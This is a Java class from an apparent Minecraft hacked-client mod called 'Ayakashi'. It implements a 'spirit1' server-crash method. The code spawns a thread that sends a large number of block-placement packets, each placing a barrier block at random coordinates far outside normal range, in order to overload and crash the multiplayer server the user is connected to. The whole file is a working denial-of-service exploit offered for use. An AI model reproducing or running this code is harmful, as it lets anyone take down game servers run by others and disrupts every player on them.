package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.helpers.RandomHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

@CrashInfo(
        name = "spirit1"
)
public class CrashSpirit1 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Spirit method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                ItemStack block = new ItemStack(Blocks.barrier);
                for (int i = 0; i < packets; ++i) {
                    for (int i3 = 0; i3 < 100; ++i3)
                        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX + RandomHelper.getRandomHelper().getRandomInt(1000, 2147483647), (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ + RandomHelper.getRandomHelper().getRandomInt(1000, 2147483647)), 1, block, 0.0F, 0.0F, 0.0F));
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
